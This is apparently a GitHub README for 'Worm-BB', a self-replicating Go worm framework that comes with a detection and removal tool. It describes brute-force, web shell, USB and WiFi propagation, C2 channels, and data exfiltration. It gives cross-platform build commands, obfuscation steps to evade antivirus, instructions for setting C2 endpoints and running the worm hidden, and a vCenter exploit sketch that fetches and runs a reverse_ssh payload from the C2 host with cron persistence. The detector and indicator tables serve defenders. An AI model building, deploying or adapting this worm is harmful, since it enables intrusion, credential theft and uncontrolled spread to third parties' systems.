# Worm-BB: Self-Replicating Worm for Red & Blue Teams

![ek0ms Banner](https://img.shields.io/badge/ek0ms-certified_ethical_hacker-black)

![image1(1)](https://github.com/user-attachments/assets/c4cd71ae-1fce-4892-a3ae-c6fd9fe8ba3d)

**Educational Purpose Only**

Worm-BB is a research‑grade, multi‑platform worm framework written in Go. It demonstrates modern autonomous propagation techniques, stealth command & control, USB and WiFi‑based spreading, web shell persistence, and data exfiltration. The companion detection and removal tool (v2.0) provides comprehensive coverage for blue teams to identify and eradicate Worm‑BB infections across Windows, Linux, and macOS environments.

**This repository is for authorized security testing, research, and defense training only.**

---

## Overview

Worm‑BB implements the classic worm trinity: **Scan → Exploit → Replicate**. It spreads across networks, USB drives, and rogue WiFi access points, establishes deep persistence on Windows, Linux, and macOS, and communicates with a C2 server via WebSockets, DNS tunnelling, and HTTP beacons. The detector tool (`worm_bb_detector` v2.0) provides complete coverage for all Worm‑BB v4.0 artifacts – processes, files, registry keys, scheduled tasks, cron jobs, systemd services, init scripts, launch agents, WMI subscriptions, USB autorun files, web shells, WiFi evil portal artifacts, P2P multicast traffic, and memory signatures.

Both components are written entirely in Go, making them cross‑platform, statically linked, and difficult to detect by signature‑based AVs (when compiled with obfuscation).

---

## Capabilities

### Worm Framework (`worm.go`)

| Module               | Description |
|----------------------|-------------|
| **SSH Bruteforce**   | Default credential list (`root:root`, `admin:admin`, `pi:raspberry`, etc.) + payload deployment. |
| **SMB/EternalBlue**  | Detection of port 445; exploit hooks ready. |
| **WebShell**         | Uploads PHP/ASP/Python shells via PUT, POST, FTP, WebDAV; backdoor deployment. |
| **vCenter (NEW)**    | CVE-2026-59310 exploitation; reverse_ssh deployment; cron persistence. |
| **USB Propagation**  | Monitors removable drives, copies worm, creates `autorun.inf` (Windows), launchd plist (macOS), udev rules (Linux), hides files. |
| **WiFi Evil Portal** | Rogue AP with DNS spoofing, captive portal, deauth attack; forces worm download. |
| **P2P Coordination** | Multicast peer discovery (`239.255.42.42:4242`), leader election, population management. |
| **C2 Channels**      | WebSocket (WSS), DNS tunnelling (A/TXT queries), HTTP/S beacons with random User‑Agent. |
| **Data Exfiltration**| Batched, AES‑encrypted exfil to MySQL or HTTPS endpoint; steals creds, files, screenshots. |
| **Persistence**      | Windows: Run keys, scheduled tasks, WMI, Startup folder. Linux: crontab, systemd, init.d, rc.local, udev, SSH keys. macOS: launchd, cron. |

### Detection & Removal Tool v2.0 (`worm_bb_detector.go`)

| Scan Category       | Detects |
|---------------------|---------|
| **Processes**       | Names `system-update`, `SystemUpdate`, `worm_bb`, suspicious cmdline with WiFi/evil portal indicators. |
| **Filesystem**      | Known worm paths, temp directories, hidden files, web shells, WiFi configs, init scripts. |
| **Registry**        | Run keys containing `SystemUpdate` across HKCU and HKLM hives. |
| **Scheduled Tasks** | `SystemUpdateTask`, `SystemUpdateTask_startup` with hourly triggers. |
| **WMI**             | `__EventFilter` (`SystemUpdateFilter`), `CommandLineEventConsumer` (`SystemUpdateConsumer`), and filter-to-consumer bindings. |
| **Cron (Linux)**    | `@reboot /tmp/system-update`, `*/30 * * * * /tmp/system-update`, and other scheduled executions. |
| **Systemd**         | `system-update.service` with restart policies and multi-user target. |
| **Init.d**          | `/etc/init.d/system-update` with SysV init scripts. |
| **rc.local**        | `/etc/rc.local` entries executing `/tmp/system-update &`. |
| **LaunchAgents**    | `com.apple.systemupdate.plist` with RunAtLoad and KeepAlive. |
| **udev**            | `99-usb-autorun.rules` for USB auto-execution on Linux/ARM. |
| **SSH Keys**        | `authorized_keys` containing `worm-bb-key` backdoor. |
| **USB Drives**      | `autorun.inf`, `SystemUpdate.exe`, `.lnk` files (Windows); `SystemUpdate.app` (macOS); `.system-update`, `.system-update.desktop` (Linux). |
| **WebShells**       | PHP/ASP/Python shells and backdoors in web directories (`shell.php`, `backdoor.php`, `shell.aspx`, `system-update.php`). |
| **WiFi/Evil Portal**| `hostapd.conf`, `dhcpd.conf`, dnsmasq configs, iptables NAT rules, captive portal artifacts. |
| **P2P Network**     | Multicast listener on `239.255.42.42:4242`, listening P2P ports (4242, 4243, 4444), active P2P connections. |
| **Mutex/Lock**      | Windows mutex `Global\SystemUpdateMutex`, Linux lock file `/tmp/.system-update.lock`. |
| **Memory**          | Loaded module strings on Windows (`tasklist /M`), memory maps on Linux (`/proc/*/maps`). |
| **vCenter (NEW)**   | `reverse_ssh` process, `/tmp/reverse_ssh` file, unauthorized cron entries on vCenter. |

#### Remediation Actions

The detector generates comprehensive remediation actions for each finding:

| Action               | Description |
|----------------------|-------------|
| `KILL_PROCESS`       | Terminate suspicious worm processes |
| `DELETE_FILE`        | Remove worm executables, configs, and artifacts |
| `DELETE_REGISTRY`    | Remove worm registry keys and values |
| `DELETE_TASK`        | Delete scheduled tasks |
| `DELETE_CRON`        | Remove cron jobs |
| `STOP_SERVICE`       | Stop and disable systemd services |
| `DELETE_WMI`         | Remove WMI event filters and consumers |
| `CLEAN_USB`          | Comprehensive USB drive cleanup (all platforms) |
| `DELETE_SSH_KEY`     | Remove backdoor SSH keys |
| `DELETE_LAUNCH`      | Unload and remove macOS launch agents |
| `DELETE_RCLOCAL`     | Clean rc.local entries |
| `DELETE_INIT`        | Remove init.d scripts |

The tool supports interactive (prompt per action) or fully automatic (`--auto`) mode.

## NEW VMware vCenter Exploit Module (CVE-2026-59310)

Worm-BB now includes an **enterprise-grade vCenter exploit module** targeting CVE-2026-59310 – a critical directory traversal vulnerability in VMware vCenter Syslog Server.

### What It Does

1. **Intelligent Target Detection:** When scanning port 443 (HTTPS), the worm checks for vCenter-specific endpoints (`/ui/`, `/vsphere-client/`, `/sdk/`) to identify high-value targets.

2. **Zero-Auth Exploitation:** Leverages the CVE-2026-59310 path traversal to execute commands on unpatched vCenter appliances without credentials.

3. **Payload Deployment:** Downloads `reverse_ssh` from the C2 server and establishes a persistent reverse SSH tunnel (port 443).

4. **Persistence:** Adds a cron job to ensure the backdoor survives reboots.

### How It Works

```go
// Detect vCenter by checking for VMware-specific endpoints
func (p *Propagator) isVCenter(target string) bool {
    // Check for vCenter fingerprints in HTTP responses
}

// Exploit the directory traversal and deploy reverse_ssh
func (p *Propagator) exploitVCenter(target string) bool {
    // Send payload through /syslog/../../../../path/to/rce
    // wget -O /tmp/reverse_ssh https://C2/reverse_ssh
    // /tmp/reverse_ssh -l C2 -p 443 &
    // (crontab -l; echo "@reboot ...") | crontab -
}
```

### Attack Chain

1. **Scan:** Worm finds an open port 443 on a network host.
2. **Detect:** Worm identifies the target as a vCenter server.
3. **Exploit:** Worm sends a payload via CVE-2026-59310.
4. **Persist:** Worm installs `reverse_ssh` with cron persistence.
5. **Control:** Attacker maintains persistent access via reverse SSH.

### Detection Indicators for Blue Teams

| Indicator | Description |
|-----------|-------------|
| **Network** | Outbound SSH connections from vCenter on port 443 |
| **Processes** | `reverse_ssh` process running on vCenter |
| **Files** | `/tmp/reverse_ssh` binary on vCenter |
| **Cron** | `@reboot /tmp/reverse_ssh -l <C2> -p 443` |
| **Logs** | Directory traversal attempts in `/var/log/messages` |

### Remediation

- **Patch:** Upgrade to vCenter 9.1.0.0300 or later
- **Monitor:** Alert on unauthorized cron entries on vCenter
- **Network:** Block unexpected outbound SSH on port 443
- **Endpoint:** Search for `/tmp/reverse_ssh` across vCenter clusters

> **Note:** This exploit was actively used in campaigns throughout 2026 affecting 361+ organizations across 47 countries. Update your vCenter instances immediately.

---
---

## Build Instructions

### Prerequisites

- Go 1.16+ (`go version`)
- **Optional dependencies** for WiFi modules (Linux only):
  ```bash
  sudo apt install hostapd dnsmasq
  ```
  (On ARM/embedded, these packages are also available via `apt`.)
- For cross‑compilation to Windows (optional):
  ```bash
  sudo apt install gcc-mingw-w64-x86-64
  ```

### Install Go Dependencies

```bash
go mod init worm_bb
go get -u github.com/gorilla/websocket
go get -u github.com/miekg/dns
go get -u github.com/go-sql-driver/mysql
go get -u golang.org/x/crypto/ssh
```

### Compile the Worm (`worm.go`)

The worm is now a **single, self-contained file** that compiles on any platform without external dependencies or build tags.

```bash
# Linux (x86_64)
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o worm_bb worm.go

# Linux (ARMv7, e.g. Raspberry Pi)
CGO_ENABLED=0 GOOS=linux GOARCH=arm GOARM=7 go build -ldflags="-s -w" -o worm_bb_arm worm.go

# Linux (ARM64)
CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -ldflags="-s -w" -o worm_bb_arm64 worm.go

# Windows (x86_64) – hide console
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o worm_bb.exe worm.go

# macOS (Intel)
CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o worm_bb_mac worm.go

# macOS (Apple Silicon)
CGO_ENABLED=0 GOOS=darwin GOARCH=arm64 go build -ldflags="-s -w" -o worm_bb_mac_arm64 worm.go
```

> **Note**: The worm now uses `CGO_ENABLED=0` for all builds, making it fully statically linked and portable across systems. The vCenter exploit uses HTTPS/HTTP only – no CGO required.

### Compile the Detector v2.0 (`worm_bb_detector.go`)

```bash
# Linux
go build -ldflags="-s -w" -o worm_bb_detector worm_bb_detector.go

# Windows
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o worm_bb_detector.exe worm_bb_detector.go

# macOS
GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o worm_bb_detector_mac worm_bb_detector.go
```

### Obfuscation (Optional, Lowers Detection Rate)

```bash
go install mvdan.cc/garble@latest
garble -literals -tiny -seed=random build -ldflags="-s -w" -o worm_bb_obf worm.go
```

---

## Usage – Worm Framework

**Before you run:** Change the C2 constants in `worm.go` to point to your own infrastructure:

```go
const (
    C2_WEBSOCKET      = "wss://your-c2.com:8443/ws"
    C2_DNS_DOMAIN     = "your-c2.com"
    DATA_EXFIL_SERVER = "https://your-c2.com:8443/upload"
)
```

Also update the WiFi SSID and other parameters as needed.

### Run the Worm

```bash
# Linux – background, no output
./worm_bb > /dev/null 2>&1 &

# Windows – hidden (compiled with -H=windowsgui)
worm_bb.exe

# Manual execution with output (for debugging)
./worm_bb
```

On first run, the worm:
1. Checks for existing instances (mutex, lock file, listening ports).
2. Installs persistence (registry, crontab, systemd, launchd, init.d, rc.local, etc.).
3. Joins the P2P multicast group.
4. Begins scanning and propagating.

### Behaviour Tuning

The worm automatically selects a propagation strategy based on local population:
- `FULL_INSTALL` – no other worms → aggressive scanning.
- `SUPPLEMENT_PROPAGATION` – few worms → fill gaps.
- `COORDINATED_SCAN` – many worms → leader distributes tasks.
- `EXPAND_NETWORK` – current network saturated → random /24 scans.
- `STEALTH_MODE` – high density → one host per 5 minutes.

### Cleanup

To remove the worm after testing, either run the detection tool (see next section) or manually delete:

**Linux**
```bash
pkill -f system-update
rm -f /tmp/system-update /tmp/.system-update /tmp/worm
rm -f /etc/systemd/system/system-update.service
crontab -l | grep -v system-update | crontab -
rm -f /etc/udev/rules.d/99-usb-autorun.rules
rm -f /etc/init.d/system-update
update-rc.d system-update remove
sed -i '/\/tmp\/system-update &/d' /etc/rc.local
```

**Windows**
```cmd
taskkill /F /IM SystemUpdate.exe
schtasks /delete /tn SystemUpdateTask /f
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemUpdate /f
reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v SystemUpdate /f
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.exe"
del "C:\Windows\Temp\system-update.exe"
```

**macOS**
```bash
launchctl unload ~/Library/LaunchAgents/com.apple.systemupdate.plist
rm ~/Library/LaunchAgents/com.apple.systemupdate.plist
crontab -l | grep -v systemupdate | crontab -
rm -f /tmp/system-update
```

---

## Usage – Detection & Removal Tool v2.0

The detector scans for all Worm‑BB indicators across all platforms and optionally removes them.

### Basic Scan (Interactive)

```bash
# Linux (run as root for full coverage)
sudo ./worm_bb_detector

# Windows (run as Administrator)
worm_bb_detector.exe

# macOS
sudo ./worm_bb_detector_mac
```

You will be prompted before each remediation action.

### Fully Automatic Scan & Clean

```bash
sudo ./worm_bb_detector --auto --network
```

- `--auto` – automatically executes all remediations without prompting.
- `--network` – enables full network scanning (multicast, P2P ports, WiFi artifacts).

### Save JSON Report

```bash
sudo ./worm_bb_detector --output scan_report.json
```

### Example Output

```
================================================
WORM-BB DETECTION AND REMOVAL TOOL v2.0
Full coverage for Worm-BB v4.0-DEFCON-ARM
================================================
[*] Scanning for worm processes...
[*] Scanning for worm files...
[*] Scanning for USB drives...
[*] Scanning for WebShells...
[*] Scanning for WiFi artifacts...
[*] Scanning for P2P communication...
[!] WORM DETECTED! Severity: CRITICAL
[!] Found 12 indicators
...
[?] Remediation: KILL_PROCESS
    Target: PID 1337
    Command: kill -9 1337
    Execute? (y/N): y
[+] Success: KILL_PROCESS completed
...
[+] All remediations completed successfully!
```

### Exit Codes

| Code | Meaning                     |
|------|-----------------------------|
| 0    | No worm detected            |
| 1    | Worm detected and remediated|

---

## 🛡️ vCenter-Specific Detection

The detector v2.0 now includes specific checks for vCenter compromise:

```bash
# Look for reverse_ssh process on vCenter
ps aux | grep -E "reverse_ssh|reversessh"

# Check for unauthorized cron entries on vCenter
crontab -l | grep -E "reverse_ssh|443"

# Search for reverse_ssh binary
find / -name "reverse_ssh" 2>/dev/null

# Check for suspicious outbound connections
lsof -i :443 | grep ESTABLISHED
```

---

## Ethical & Legal Disclaimer

**This software is provided for educational and authorised security testing only.**

![image1(1)](https://github.com/user-attachments/assets/4e693f4d-10f3-43e2-b204-2c1585e03535)

---

# Read my Worm‑BB research, walkthroughs and articles here:

- https://churchofmalware.org/articles/wormBB_article_md
- https://ek0mssavi0r.dev  
- https://medium.com/@ekoms1/the-fascinating-world-of-self-replicating-worms-0e6ad768a001  
- https://substack.com/@ek0mssavi0r/p-193527720

